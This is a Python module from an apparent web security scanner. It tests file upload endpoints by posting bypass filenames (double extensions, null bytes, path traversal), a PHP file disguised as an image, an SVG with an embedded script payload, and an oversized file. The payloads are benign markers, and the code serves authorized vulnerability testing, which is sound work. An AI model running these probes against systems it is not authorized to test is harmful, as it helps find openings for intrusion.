"""Module 26 — File Upload Vulnerability Testing.

Tests file upload functionality for unrestricted file type uploads,
path traversal in filenames, and executable upload bypass.
"""

import json
import logging
import io
from pathlib import Path

import requests

logger = logging.getLogger("cyberpulse.modules.m26")

UPLOAD_PATHS = [
    "/upload", "/file-upload", "/api/upload", "/api/files",
    "/media/upload", "/images/upload", "/attachments",
    "/wp-content/uploads", "/admin/upload", "/filemanager",
]

# Test files with various extensions
BYPASS_EXTENSIONS = [
    ".php", ".php5", ".php7", ".phtml", ".phar",
    ".asp", ".aspx", ".ashx", ".asmx",
    ".jsp", ".jspx",
    ".py", ".rb", ".pl", ".cgi",
    ".svg", ".html", ".htm", ".xhtml",
    ".shtml", ".shtm",
]

# Double extension and null byte bypasses
BYPASS_FILENAMES = [
    "test.php.jpg",
    "test.jpg.php",
    "test.php%00.jpg",
    "test.php;.jpg",
    "test.php/.jpg",
    "test.pHp",                  # Case variation
    "test.php5",
    "test.php      ",           # Trailing spaces
    "test.php.",                 # Trailing dot
    "test.jpg\x00.php",
    "../../../test.php",        # Path traversal
    "....//....//test.php",
]


class Scanner:
    name = "File Upload Testing"
    phase = "exploitation"
    description = "Tests file upload functionality for bypass vulnerabilities"

    def __init__(self, target: str, output_dir: Path, config: dict):
        self.target = target
        self.output_dir = Path(output_dir)
        self.config = config
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 CyberPulse/1.0"
        self.session.verify = False

    def run(self) -> dict:
        findings = []
        raw_lines = [f"File upload vulnerability testing for {self.target}"]
        base_url = self._get_base_url()

        # Phase 1: Find upload endpoints
        raw_lines.append("\n[Phase 1: Upload Endpoint Discovery]")
        upload_endpoints = []
        for path in UPLOAD_PATHS:
            url = base_url + path
            try:
                resp = self.session.get(url, timeout=8)
                if resp.status_code == 200:
                    if any(kw in resp.text.lower() for kw in
                           ("upload", "file", "multipart", "enctype", "dropzone")):
                        upload_endpoints.append(path)
                        raw_lines.append(f"  Upload form found: {path}")
                elif resp.status_code == 405:
                    # Accepts POST but not GET
                    upload_endpoints.append(path)
                    raw_lines.append(f"  Upload endpoint (POST only): {path}")
            except Exception:
                continue

        # Also scan HTML for upload forms
        raw_lines.append("\n  Scanning HTML for upload forms...")
        html_uploads = self._find_upload_forms(base_url)
        for form_url in html_uploads:
            raw_lines.append(f"  Upload form in HTML: {form_url}")
            if form_url not in upload_endpoints:
                upload_endpoints.append(form_url)

        if not upload_endpoints:
            raw_lines.append("  No upload endpoints found")
            findings.append({
                "type": "no_upload_endpoints",
                "detail": "No file upload functionality detected",
                "severity": "info",
            })
        else:
            findings.append({
                "type": "upload_endpoints_found",
                "endpoints": upload_endpoints,
                "detail": f"Found {len(upload_endpoints)} upload endpoint(s)",
                "severity": "info",
            })

        # Phase 2: Test each endpoint
        for ep in upload_endpoints:
            url = base_url + ep
            raw_lines.append(f"\n[Phase 2: Testing {ep}]")

            # Test content-type bypass
            raw_lines.append("  [Content-Type Bypass]")
            ct_bypass = self._test_content_type_bypass(url)
            if ct_bypass:
                findings.append(ct_bypass)
                raw_lines.append(f"    VULNERABLE: {ct_bypass['detail']}")

            # Test extension bypass
            raw_lines.append("  [Extension Bypass]")
            for filename in BYPASS_FILENAMES[:8]:
                ext_result = self._test_extension_upload(url, filename)
                if ext_result:
                    findings.append(ext_result)
                    raw_lines.append(f"    VULNERABLE: {ext_result['detail']}")
                    break

            # Test SVG XSS upload
            raw_lines.append("  [SVG XSS Upload]")
            svg_result = self._test_svg_xss(url)
            if svg_result:
                findings.append(svg_result)
                raw_lines.append(f"    VULNERABLE: {svg_result['detail']}")

            # Test oversized file
            raw_lines.append("  [File Size Limit]")
            size_result = self._test_large_file(url)
            if size_result:
                findings.append(size_result)
                raw_lines.append(f"    {size_result['detail']}")

        raw_output = "\n".join(raw_lines)
        outfile = self.output_dir / "26_file_upload.json"
        with open(outfile, "w", encoding="utf-8") as f:
            json.dump({"findings": findings}, f, indent=2)

        logger.info("File upload scan %s: %d findings", self.target, len(findings))
        return {"findings": findings, "raw_output": raw_output}

    def _test_content_type_bypass(self, url: str):
        """Upload a PHP file disguised as image."""
        content = b"<?php echo 'cyberpulse_test'; ?>"
        files = {"file": ("test.php", io.BytesIO(content), "image/jpeg")}
        try:
            resp = self.session.post(url, files=files, timeout=10)
            if resp.status_code in (200, 201):
                return {
                    "type": "upload_content_type_bypass",
                    "endpoint": url,
                    "detail": f"PHP file accepted with image/jpeg Content-Type at {url}",
                    "severity": "critical",
                }
        except Exception:
            pass
        return None

    def _test_extension_upload(self, url: str, filename: str):
        """Test uploading a file with a bypass filename."""
        content = b"cyberpulse upload test"
        files = {"file": (filename, io.BytesIO(content), "application/octet-stream")}
        try:
            resp = self.session.post(url, files=files, timeout=10)
            if resp.status_code in (200, 201):
                return {
                    "type": "upload_extension_bypass",
                    "endpoint": url,
                    "filename": filename,
                    "detail": f"File '{filename}' accepted at {url}",
                    "severity": "high",
                }
        except Exception:
            pass
        return None

    def _test_svg_xss(self, url: str):
        """Upload an SVG containing XSS payload."""
        svg = b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("cyberpulse")</script></svg>'
        files = {"file": ("test.svg", io.BytesIO(svg), "image/svg+xml")}
        try:
            resp = self.session.post(url, files=files, timeout=10)
            if resp.status_code in (200, 201):
                return {
                    "type": "upload_svg_xss",
                    "endpoint": url,
                    "detail": f"SVG with embedded script accepted at {url}",
                    "severity": "high",
                }
        except Exception:
            pass
        return None

    def _test_large_file(self, url: str):
        """Test if there's a file size limit."""
        # 10MB of zeros
        content = b"\x00" * (10 * 1024 * 1024)
        files = {"file": ("large.bin", io.BytesIO(content), "application/octet-stream")}
        try:
            resp = self.session.post(url, files=files, timeout=30)
            if resp.status_code in (200, 201):
                return {
                    "type": "upload_no_size_limit",
                    "endpoint": url,
                    "detail": f"No file size limit enforced at {url} (10MB accepted)",
                    "severity": "medium",
                }
        except Exception:
            pass
        return None

    def _find_upload_forms(self, base_url: str) -> list[str]:
        """Find upload forms in HTML."""
        import re
        forms = []
        try:
            resp = self.session.get(base_url, timeout=10)
            # Find forms with enctype=multipart/form-data
            pattern = r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*action=["\']([^"\']*)["\']'
            matches = re.findall(pattern, resp.text, re.I)
            forms.extend(matches)
            # Also find file inputs
            if 'type="file"' in resp.text or "type='file'" in resp.text:
                form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
                all_forms = re.findall(form_pattern, resp.text, re.I)
                forms.extend(all_forms)
        except Exception:
            pass
        return list(set(forms))

    def _get_base_url(self) -> str:
        for scheme in ("https", "http"):
            try:
                self.session.head(f"{scheme}://{self.target}", timeout=5)
                return f"{scheme}://{self.target}"
            except Exception:
                continue
        return f"http://{self.target}"
